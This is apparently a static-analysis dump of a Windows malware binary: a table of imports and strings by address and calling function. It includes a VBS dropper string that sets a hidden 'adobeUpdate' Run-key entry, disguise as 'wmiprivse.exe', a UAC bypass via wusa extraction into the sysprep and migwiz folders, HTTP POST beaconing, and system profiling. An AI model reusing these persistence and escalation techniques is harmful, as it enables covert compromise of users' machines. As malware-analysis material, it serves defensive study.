reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x401f39	0x409050	import	0x401d80	KERNEL32.dll.CreateFileA
0x401f6e	0x40904c	import	0x401d80	KERNEL32.dll.WriteFile
0x402015	0x4090f0	import	0x401d80	KERNEL32.dll.Sleep
0x402023	0x4090e0	import	0x401d80	KERNEL32.dll.CloseHandle
0x4021b2	0x4093c8	string	0x402050	reg delete "
0x4021bc	0x4090d4	import	0x402050	KERNEL32.dll.lstrcpyA
0x4021c2	0x409038	import	0x402050	KERNEL32.dll.lstrcatA
0x4021d4	0x4093b4	string	0x402050	" /v adobeUpdate /f
0x40226f	0x40916c	import	0x402220	MSVCR90.dll._strupr
0x402283	0x409180	import	0x402220	MSVCR90.dll.strstr
0x4022c9	0x4093d8	string	0x402220	strstr Suc
0x402324	0x4093f4	string	0x402310	Enter DoCommand
0x402372	0x40916c	import	0x402310	MSVCR90.dll._strupr
0x40237f	0x409328	string	0x402310	!UNINSTALL
0x402385	0x409180	import	0x402310	MSVCR90.dll.strstr
0x4023bd	0x409060	import	0x402310	KERNEL32.dll.GetTempPathA
0x4023cf	0x4093e4	string	0x402310	~Nt94791024.bat
0x402420	0x40905c	import	0x402310	KERNEL32.dll.GetModuleFileNameA
0x40244e	0x409058	import	0x402310	KERNEL32.dll.ExitProcess
0x4024af	0x409198	import	0x402470	MSVCR90.dll.sprintf
0x4024d5	0x409070	import	0x402470	KERNEL32.dll.lstrcmpA
0x4024f0	0x409070	import	0x402470	KERNEL32.dll.lstrcmpA
0x4024fe	0x409404	string	0x402470	\*.*
0x40250b	0x409038	import	0x402470	KERNEL32.dll.lstrcatA
0x40251e	0x40906c	import	0x402470	KERNEL32.dll.FindFirstFileA
0x402583	0x409038	import	0x402470	KERNEL32.dll.lstrcatA
0x402638	0x409038	import	0x402470	KERNEL32.dll.lstrcatA
0x4026c8	0x409198	import	0x402470	MSVCR90.dll.sprintf
0x4026dc	0x409068	import	0x402470	KERNEL32.dll.FindNextFileA
0x4026ef	0x409064	import	0x402470	KERNEL32.dll.FindClose
0x40275f	0x40907c	import	0x402720	KERNEL32.dll.GetLogicalDriveStringsA
0x4027a4	0x409198	import	0x402720	MSVCR90.dll.sprintf
0x4027ae	0x4027b2	string	0x402720	3\rt,P
0x4027ed	0x409078	import	0x402720	KERNEL32.dll.GetDriveTypeA
0x40285f	0x40942c	string	0x402720	kernel32.DLL
0x402864	0x4090d8	import	0x402720	KERNEL32.dll.LoadLibraryA
0x402870	0x409418	string	0x402720	GetDiskFreeSpaceEx
0x402876	0x4090e8	import	0x402720	KERNEL32.dll.GetProcAddress
0x402893	0x409074	import	0x402720	KERNEL32.dll.FreeLibrary
0x402977	0x409454	string	0x402720	Enter upload...
0x4029e4	0x409038	import	0x402720	KERNEL32.dll.lstrcatA
0x403453	0x409170	import	0x4033d0	MSVCR90.dll._itoa
0x403497	0x40919c	import	0x4033d0	MSVCR90.dll._beginthreadex
0x4034dc	0x40919c	import	0x4033d0	MSVCR90.dll._beginthreadex
0x403521	0x40919c	import	0x4033d0	MSVCR90.dll._beginthreadex
0x403566	0x40919c	import	0x4033d0	MSVCR90.dll._beginthreadex
0x40359b	0x409054	import	0x4033d0	KERNEL32.dll.DeleteFileA
0x4036ae	0x4090f0	import	0x403660	KERNEL32.dll.Sleep
0x4036e7	0x4090d4	import	0x403660	KERNEL32.dll.lstrcpyA
0x403711	0x4094f8	string	0x403660	%s:%d
0x403722	0x409198	import	0x403660	MSVCR90.dll.sprintf
0x403897	0x4090d4	import	0x403870	KERNEL32.dll.lstrcpyA
0x40389d	0x409038	import	0x403870	KERNEL32.dll.lstrcatA
0x4038c4	0x4090cc	import	0x403870	KERNEL32.dll.lstrlenA
0x403940	0x4090cc	import	0x4038e0	KERNEL32.dll.lstrlenA
0x40394d	0x409504	string	0x4038e0	%04d
0x403953	0x409198	import	0x4038e0	MSVCR90.dll.sprintf
0x4039ae	0x409208	import	0x4038e0	WININET.dll.InternetWriteFile
0x4039fd	0x4090cc	import	0x4039e0	KERNEL32.dll.lstrlenA
0x403a3d	0x4090cc	import	0x403a20	KERNEL32.dll.lstrlenA
0x403a84	0x4090cc	import	0x403a60	KERNEL32.dll.lstrlenA
0x403ada	0x4090d4	import	0x403a60	KERNEL32.dll.lstrcpyA
0x403af4	0x409174	import	0x403a60	MSVCR90.dll._strlwr
0x403afe	0x40950c	string	0x403a60	http://
0x403b04	0x409180	import	0x403a60	MSVCR90.dll.strstr
0x403b31	0x409038	import	0x403a60	KERNEL32.dll.lstrcatA
0x403b6a	0x409200	import	0x403b60	WININET.dll.InternetCloseHandle
0x403b7b	0x409204	import	0x403b60	WININET.dll.HttpEndRequestA
0x403bde	0x4090cc	import	0x403bd0	KERNEL32.dll.lstrlenA
0x403bef	0x403cfa	string	0x403bd0	_^]3
0x403c00	0x403cfa	string	0x403bd0	_^]3
0x403c1d	0x409528	string	0x403bd0	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
0x403c22	0x4091f0	import	0x403bd0	WININET.dll.InternetOpenA
0x403c30	0x403cfa	string	0x403bd0	_^]3
0x403c66	0x4091f4	import	0x403bd0	WININET.dll.InternetConnectA
0x403c74	0x403cfa	string	0x403bd0	_^]3
0x403c88	0x40951c	string	0x403bd0	HTTP/1.1
0x403c8e	0x409514	string	0x403bd0	POST
0x403cac	0x4091f8	import	0x403bd0	WININET.dll.HttpOpenRequestA
0x403cba	0x403cfa	string	0x403bd0	_^]3
0x403cbc	0x409218	import	0x403bd0	WININET.dll.InternetSetOptionA
0x403cd8	0x403cfa	string	0x403bd0	_^]3
0x403d95	0x409570	string	0x403d10	Connection: close\r\n
0x403d9f	0x4090d4	import	0x403d10	KERNEL32.dll.lstrcpyA
0x403dab	0x4091fc	import	0x403d10	WININET.dll.HttpAddRequestHeadersA
0x403df8	0x4091ec	import	0x403d10	WININET.dll.HttpSendRequestExA
0x403e0c	0x40908c	import	0x403d10	KERNEL32.dll.GetLastError
0x403e3b	0x409218	import	0x403d10	WININET.dll.InternetSetOptionA
0x403ed1	0x4091ec	import	0x403d10	WININET.dll.HttpSendRequestExA
0x403ee4	0x4090f0	import	0x403d10	KERNEL32.dll.Sleep
0x403f09	0x409218	import	0x403d10	WININET.dll.InternetSetOptionA
0x403f8d	0x4091ec	import	0x403d10	WININET.dll.HttpSendRequestExA
0x403f9c	0x4090f0	import	0x403d10	KERNEL32.dll.Sleep
0x40403f	0x409204	import	0x404010	WININET.dll.HttpEndRequestA
0x404085	0x40920c	import	0x404010	WININET.dll.HttpQueryInfoA
0x404099	0x409070	import	0x404010	KERNEL32.dll.lstrcmpA
0x4040d1	0x409218	import	0x404010	WININET.dll.InternetSetOptionA
0x4040e0	0x409184	import	0x404010	MSVCR90.dll.atoi
0x4041a0	0x409208	import	0x404010	WININET.dll.InternetWriteFile
0x4041b3	0x409204	import	0x404010	WININET.dll.HttpEndRequestA
0x4041d1	0x40920c	import	0x404010	WININET.dll.HttpQueryInfoA
0x4041e5	0x409070	import	0x404010	KERNEL32.dll.lstrcmpA
0x404217	0x409218	import	0x404010	WININET.dll.InternetSetOptionA
0x404230	0x409184	import	0x404010	MSVCR90.dll.atoi
0x4042cf	0x409208	import	0x404010	WININET.dll.InternetWriteFile
0x4042e2	0x409204	import	0x404010	WININET.dll.HttpEndRequestA
0x404300	0x40920c	import	0x404010	WININET.dll.HttpQueryInfoA
0x404314	0x409070	import	0x404010	KERNEL32.dll.lstrcmpA
0x4043f9	0x409208	import	0x404390	WININET.dll.InternetWriteFile
0x404410	0x409204	import	0x404390	WININET.dll.HttpEndRequestA
0x404457	0x40920c	import	0x404390	WININET.dll.HttpQueryInfoA
0x40446b	0x409070	import	0x404390	KERNEL32.dll.lstrcmpA
0x404475	0x40908c	import	0x404390	KERNEL32.dll.GetLastError
0x4044f1	0x409204	import	0x4044a0	WININET.dll.HttpEndRequestA
0x40451b	0x40920c	import	0x4044a0	WININET.dll.HttpQueryInfoA
0x40452f	0x409070	import	0x4044a0	KERNEL32.dll.lstrcmpA
0x404541	0x409210	import	0x4044a0	WININET.dll.InternetReadFile
0x404618	0x409204	import	0x4045f0	WININET.dll.HttpEndRequestA
0x40465a	0x40920c	import	0x4045f0	WININET.dll.HttpQueryInfoA
0x404672	0x409070	import	0x4045f0	KERNEL32.dll.lstrcmpA
0x4046a5	0x409210	import	0x4045f0	WININET.dll.InternetReadFile
0x404747	0x4090d4	import	0x4045f0	KERNEL32.dll.lstrcpyA
0x40474d	0x409588	string	0x4045f0	szUploadFileName
0x404781	0x409050	import	0x4045f0	KERNEL32.dll.CreateFileA
0x404809	0x40904c	import	0x4045f0	KERNEL32.dll.WriteFile
0x404814	0x4090f0	import	0x4045f0	KERNEL32.dll.Sleep
0x40485c	0x4090e0	import	0x4045f0	KERNEL32.dll.CloseHandle
0x404867	0x404707	string	0x4045f0	_[^]
0x4048b3	0x4090f0	import	0x4048a0	KERNEL32.dll.Sleep
0x404909	0x409208	import	0x4048c0	WININET.dll.InternetWriteFile
0x404976	0x409090	import	0x404970	KERNEL32.dll.GetWindowsDirectoryA
0x40497d	0x409038	import	0x404970	KERNEL32.dll.lstrcatA
0x40498d	0x4091e4	import	0x404970	SHELL32.dll.SHGetSpecialFolderPathA
0x4049ab	0x40959c	string	0x404970	\Temp
0x4049ea	0x40959c	string	0x404970	\Temp
0x404aa9	0x409038	import	0x404a70	KERNEL32.dll.lstrcatA
0x404aaf	0x409368	string	0x404a70	\wmiprivse.exe
0x404ada	0x4090d4	import	0x404a70	KERNEL32.dll.lstrcpyA
0x404b0e	0x40905c	import	0x404a70	KERNEL32.dll.GetModuleFileNameA
0x404b14	0x409174	import	0x404a70	MSVCR90.dll._strlwr
0x404b58	0x4091e4	import	0x404a70	SHELL32.dll.SHGetSpecialFolderPathA
0x404b5e	0x409094	import	0x404a70	KERNEL32.dll.MoveFileExA
0x404b64	0x4091a0	import	0x404a70	MSVCR90.dll._mbscmp
0x404b88	0x409368	string	0x404a70	\wmiprivse.exe
0x404bf9	0x40967c	string	0x404a70	MoveFile Error!\r\n
0x404bfe	0x4091a4	import	0x404a70	MSVCR90.dll.printf
0x404c87	0x409060	import	0x404a70	KERNEL32.dll.GetTempPathA
0x404c8d	0x40966c	string	0x404a70	~msincreade.vbs
0x404cb6	0x409050	import	0x404a70	KERNEL32.dll.CreateFileA
0x404cdb	0x4095c0	string	0x404a70	Set ws = CreateObject("Wscript.Shell")\r\nws.run "%s",vbhide\r\nws.run "REG ADD HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN /v adobeupdate /t REG_SZ /d %s /f",vbhide
0x404ce1	0x409198	import	0x404a70	MSVCR90.dll.sprintf
0x404d0e	0x40904c	import	0x404a70	KERNEL32.dll.WriteFile
0x404d15	0x4090e0	import	0x404a70	KERNEL32.dll.CloseHandle
0x404d2d	0x4091e0	import	0x404a70	SHELL32.dll.ShellExecuteA
0x404e9c	0x4095b0	string	0x404a70	Advapi32
0x404ec2	0x4090d8	import	0x404a70	KERNEL32.dll.LoadLibraryA
0x404eda	0x4090e8	import	0x404a70	KERNEL32.dll.GetProcAddress
0x404f31	0x4090cc	import	0x404a70	KERNEL32.dll.lstrlenA
0x404f46	0x4095a4	string	0x404a70	adobeUpdate
0x404f53	0x409004	import	0x404a70	ADVAPI32.dll.RegCloseKey
0x404fcc	0x4090cc	import	0x404f80	KERNEL32.dll.lstrlenA
0x404fd5	0x409690	string	0x404f80	Active
0x404fdd	0x409690	string	0x404f80	Active
0x405056	0x409098	import	0x405030	KERNEL32.dll.GetVersionExA
0x405169	0x409054	import	0x405160	KERNEL32.dll.DeleteFileA
0x40518d	0x409050	import	0x405160	KERNEL32.dll.CreateFileA
0x4051c5	0x40904c	import	0x405160	KERNEL32.dll.WriteFile
0x4051cb	0x4090f0	import	0x405160	KERNEL32.dll.Sleep
0x4051d9	0x4090e0	import	0x405160	KERNEL32.dll.CloseHandle
0x40525c	0x409390	string	0x4051f0	ping localhost\r\n
0x4052bc	0x409744	string	0x4051f0	start wusa %s /quiet /extract:%%windir%%\system32\sysprep\
0x4052d5	0x409708	string	0x4051f0	start wusa %s /quiet /extract:%%windir%%\system32\migwiz\
0x4052e2	0x409198	import	0x4051f0	MSVCR90.dll.sprintf
0x405312	0x4096d4	string	0x4051f0	start %%windir%%\system32\sysprep\sysprep.exe "%s"
0x40532b	0x4096a0	string	0x4051f0	start %%windir%%\system32\migwiz\migwiz.exe "%s"
0x40533e	0x409054	import	0x4051f0	KERNEL32.dll.DeleteFileA
0x40535c	0x409050	import	0x4051f0	KERNEL32.dll.CreateFileA
0x40537b	0x40904c	import	0x4051f0	KERNEL32.dll.WriteFile
0x4054cd	0x4090f0	import	0x4051f0	KERNEL32.dll.Sleep
0x4054db	0x4090e0	import	0x4051f0	KERNEL32.dll.CloseHandle
0x405516	0x409780	string	0x405510	Nothing
0x40551c	0x409180	import	0x405510	MSVCR90.dll.strstr
0x405578	0x409180	import	0x405510	MSVCR90.dll.strstr
0x405d44	0x40983c	string	0x405cd0	01234567890
0x405d89	0x4090cc	import	0x405cd0	KERNEL32.dll.lstrlenA
0x405e2a	0x410270	string	0x405cd0	000-000-000-000
0x405e3b	0x410270	string	0x405cd0	000-000-000-000
0x405eea	0x409230	import	0x405e90	WS2_32.dll.WSAStartup
0x405f02	0x409234	import	0x405e90	WS2_32.dll.gethostname
0x405f15	0x409238	import	0x405e90	WS2_32.dll.gethostbyname
0x405f27	0x40923c	import	0x405e90	WS2_32.dll.inet_ntoa
0x405f30	0x4098a4	string	0x405e90	255.255.255.0
0x405f3a	0x4090d4	import	0x405e90	KERNEL32.dll.lstrcpyA
0x405f90	0x409884	string	0x405e90	%02X-%02X-%02X-%02X-%02X-%02X
0x405f9a	0x409198	import	0x405e90	MSVCR90.dll.sprintf
0x405fb3	0x4090cc	import	0x405e90	KERNEL32.dll.lstrlenA
0x405fbb	0x4090d4	import	0x405e90	KERNEL32.dll.lstrcpyA
0x405fc5	0x409874	string	0x405e90	255.255.255.000
0x405fdc	0x409868	string	0x405e90	IBM_UNKNOW
0x405ff3	0x409854	string	0x405e90	00-00-00-00-00-00
0x40608a	0x409098	import	0x406030	KERNEL32.dll.GetVersionExA
0x4060af	0x409924	string	0x406030	Unknow
0x4060f9	0x40991c	string	0x406030	Vista
0x406148	0x40990c	string	0x406030	Win7
0x406163	0x409900	string	0x406030	Win2008R2
0x4061a2	0x4098f8	string	0x406030	Win8
0x4061ec	0x4098e8	string	0x406030	Win8.1
0x406215	0x4098dc	string	0x406030	Win2012R2
0x406247	0x4098d4	string	0x406030	Win2000
0x406268	0x4098cc	string	0x406030	WinXP
0x4062de	0x409924	string	0x406030	Unknow
0x4062e8	0x40912c	import	0x406030	MSVCR90.dll._stricmp
0x406308	0x4098b4	string	0x406030	X64
0x4063aa	0x4090a4	import	0x406370	KERNEL32.dll.GetSystemDefaultLCID
0x4063df	0x4099a8	string	0x406370	France
0x406408	0x4099a0	string	0x406370	Russia
0x406431	0x40998c	string	0x406370	TraditionChinese
0x4064a3	0x409970	string	0x406370	Korea
0x4064c0	0x409960	string	0x406370	SimpleChinese
0x406512	0x409954	string	0x406370	English(Au)
0x406539	0x409948	string	0x406370	HongKong
0x406560	0x40993c	string	0x406370	Singapore
0x406597	0x409924	string	0x406370	Unknow
0x4065bd	0x409934	string	0x406370	India
0x4065d7	0x40992c	string	0x406370	Macao
0x406713	0x4090f0	import	0x406700	KERNEL32.dll.Sleep
0x40673f	0x4099b0	string	0x406700	IsSpace+443
0x406753		string	0x406700	IsGoogle
0x406798	0x409b50	string	0x406780	enter maintrans dowork.
0x4067c2	0x40905c	import	0x406780	KERNEL32.dll.GetModuleFileNameA
0x406818	0x4090bc	import	0x406780	KERNEL32.dll.GetShortPathNameA
0x406831	0x4090b8	import	0x406780	KERNEL32.dll.CreateEventA
0x406842	0x40908c	import	0x406780	KERNEL32.dll.GetLastError
0x406885	0x409170	import	0x406780	MSVCR90.dll._itoa
0x4068b8	0x409b44	string	0x406780	Enter 7!
0x4068e0	0x409b30	string	0x406780	Enter RunAsAdmin!
0x406916	0x409060	import	0x406780	KERNEL32.dll.GetTempPathA
0x406929	0x409b24	string	0x406780	Enter64!
0x40694f	0x409198	import	0x406780	MSVCR90.dll.sprintf
0x406964	0x409b14	string	0x406780	%sFASAPI.bin
0x406987	0x409b00	string	0x406780	Release cp64 error!
0x406996	0x409058	import	0x406780	KERNEL32.dll.ExitProcess
0x4069c7	0x409af4	string	0x406780	%sFASAP.DAT
0x4069ea	0x409ad8	string	0x406780	Release crybase64 error!
0x4069f9	0x409058	import	0x406780	KERNEL32.dll.ExitProcess
0x406a3f	0x409ad0	string	0x406780	%s %s 2
0x406a72	0x409ac8	string	0x406780	%s %s 1
0x406a96	0x409058	import	0x406780	KERNEL32.dll.ExitProcess
0x406a9c	0x409abc	string	0x406780	Enter 32!
0x406ade	0x409198	import	0x406780	MSVCR90.dll.sprintf
0x406af3	0x409af4	string	0x406780	%sFASAP.DAT
0x406b16	0x409aa0	string	0x406780	Release crybase32 error!
0x406b25	0x409058	import	0x406780	KERNEL32.dll.ExitProcess
0x406b3a	0x409a90	string	0x406780	%sFASAPI.bat
0x406b7a	0x409a78	string	0x406780	Release 2 cab error!
0x406b89	0x409058	import	0x406780	KERNEL32.dll.ExitProcess
0x406bb5	0x409a60	string	0x406780	Release 1 cab error!
0x406bc4	0x409058	import	0x406780	KERNEL32.dll.ExitProcess
0x406bf0	0x409058	import	0x406780	KERNEL32.dll.ExitProcess
0x406c1d	0x409180	import	0x406780	MSVCR90.dll.strstr
0x406c27	0x409a58	string	0x406780	avgui
0x406c44	0x409a50	string	0x406780	uiSeA
0x406c8a	0x409a44	string	0x406780	wmiprivse
0x406cb0	0x4090e0	import	0x406780	KERNEL32.dll.CloseHandle
0x406cee	0x406cce	string	0x406780	]_^[
0x406cf2	0x406700	string	0x406780	SUVW
0x406cf7	0x4090f0	import	0x406780	KERNEL32.dll.Sleep
0x406d1a	0x40bd10	string	0x406780	IsGoogle
0x406d30	0x409a38	string	0x406780	IsGoogle+80
0x406d41		string	0x406780	IsGoogle
0x406d5e	0x409a2c	string	0x406780	IsSpace+80
0x406d70		string	0x406780	IsGoogle
0x406dd4	0x409a0c	string	0x406780	Begin to Create Report Thread.
0x406dde	0x40919c	import	0x406780	MSVCR90.dll._beginthreadex
0x406dfe	0x4099f0	string	0x406780	begin to Infect Machine.
0x406e1d	0x409048	import	0x406780	KERNEL32.dll.WaitForSingleObject
0x406e38	0x4099d0	string	0x406780	begin to create Trans Thread.
0x406e5a	0x4090e0	import	0x406780	KERNEL32.dll.CloseHandle
0x406e64	0x4090a8	import	0x406780	KERNEL32.dll.ResetEvent
0x406e6c	0x4099bc	string	0x406780	create Event error!
0x406ed8	0x409230	import	0x406eb0	WS2_32.dll.WSAStartup
0x406eeb	0x409244	import	0x406eb0	WS2_32.dll.WSASocketA
0x406f2a	0x409234	import	0x406eb0	WS2_32.dll.gethostname
0x406f39	0x409240	import	0x406eb0	WS2_32.dll.closesocket
0x406f3f	0x409220	import	0x406eb0	WS2_32.dll.WSACleanup
0x406f65	0x409238	import	0x406eb0	WS2_32.dll.gethostbyname
0x406f73	0x409240	import	0x406eb0	WS2_32.dll.closesocket
0x406f79	0x409220	import	0x406eb0	WS2_32.dll.WSACleanup
0x406faa	0x409224	import	0x406eb0	WS2_32.dll.htons
0x406fc6	0x409228	import	0x406eb0	WS2_32.dll.bind
0x407004	0x40922c	import	0x406eb0	WS2_32.dll.WSAIoctl
0x407012	0x409240	import	0x406eb0	WS2_32.dll.closesocket
0x407018	0x409220	import	0x406eb0	WS2_32.dll.WSACleanup
0x407101	0x4094f8	string	0x407050	%s:%d
0x40710c	0x409198	import	0x407050	MSVCR90.dll.sprintf
0x407119	0x409bd8	string	0x407050	Mozilla
0x40714f	0x409bac	string	0x407050	/5.0 (compatible; MSIE 7.0;Windows NT 5.1)
0x407173	0x4091f0	import	0x407050	WININET.dll.InternetOpenA
0x407187	0x409b98	string	0x407050	www.microsoft.com
0x407191	0x4091f4	import	0x407050	WININET.dll.InternetConnectA
0x4071ac	0x40951c	string	0x407050	HTTP/1.1
0x4071bc	0x4091f8	import	0x407050	WININET.dll.HttpOpenRequestA
0x4071e5	0x4091fc	import	0x407050	WININET.dll.HttpAddRequestHeadersA
0x4071eb	0x409b88	string	0x407050	WinINet.dll
0x4071f0	0x4090d8	import	0x407050	KERNEL32.dll.LoadLibraryA
0x4071fa	0x409b74	string	0x407050	HttpSendRequestA
0x407200	0x4090e8	import	0x407050	KERNEL32.dll.GetProcAddress
0x407214	0x409214	import	0x407050	WININET.dll.HttpSendRequestA
0x40721f	0x409200	import	0x407050	WININET.dll.InternetCloseHandle
0x407243	0x40920c	import	0x407050	WININET.dll.HttpQueryInfoA
0x407256	0x409180	import	0x407050	MSVCR90.dll.strstr
0x40725c	0x409210	import	0x407050	WININET.dll.InternetReadFile
0x40728d	0x409200	import	0x407050	WININET.dll.InternetCloseHandle
0x4074b1	0x4091a8	import	0x407460	MSVCR90.dll.strncpy
0x4074bd	0x40916c	import	0x407460	MSVCR90.dll._strupr
0x4074cc	0x409180	import	0x407460	MSVCR90.dll.strstr
0x4074db	0x409514	string	0x407460	POST
0x4074ed	0x409c04	string	0x407460	HEAD
0x4074ff	0x409bfc	string	0x407460	HTTP://
0x407518	0x409be0	string	0x407460	Proxy-Authorization: Basic
0x4075ff	0x409250	import	0x4075b0	WS2_32.dll.ntohs
0x4076e5	0x40923c	import	0x407690	WS2_32.dll.inet_ntoa
0x4076f8	0x4091ac	import	0x407690	MSVCR90.dll._snprintf
0x407705	0x40923c	import	0x407690	WS2_32.dll.inet_ntoa
0x407718	0x4091ac	import	0x407690	MSVCR90.dll._snprintf
0x4077d2	0x4090c0	import	0x407780	KERNEL32.dll.GetTickCount
0x40781a	0x409240	import	0x407780	WS2_32.dll.closesocket
0x407820	0x409220	import	0x407780	WS2_32.dll.WSACleanup
0x407872	0x409248	import	0x407780	WS2_32.dll.select
0x407881	0x409240	import	0x407780	WS2_32.dll.closesocket
0x407887	0x409220	import	0x407780	WS2_32.dll.WSACleanup
0x4078ba	0x40924c	import	0x407780	WS2_32.dll.recv
0x4078c9	0x409240	import	0x407780	WS2_32.dll.closesocket
0x4078cf	0x409220	import	0x407780	WS2_32.dll.WSACleanup
0x407907	0x409240	import	0x407780	WS2_32.dll.closesocket
0x40790d	0x409220	import	0x407780	WS2_32.dll.WSACleanup
0x407927	0x40908c	import	0x407780	KERNEL32.dll.GetLastError
0x40795c	0x4090ac	import	0x40795c	KERNEL32.dll.Process32Next
0x407962	0x4090b0	import	0x407962	KERNEL32.dll.Process32First
0x407968	0x4090b4	import	0x407968	KERNEL32.dll.CreateToolhelp32Snapshot
0x40796e	0x409030	import	0x40796e	IPHLPAPI.DLL.GetAdaptersInfo
0x407974	0x40917c	import	0x407974	MSVCR90.dll.memset
0x40798a	0x409188	import	0x40798a	MSVCR90.dll.sym_imp_void __cdecl operator delete(void *)
0x407990	0x40918c	import	0x407990	MSVCR90.dll.sym_imp_void * __cdecl operator new(unsigned int)
0x407996	0x409190	import	0x407990	MSVCR90.dll.__CxxFrameHandler3
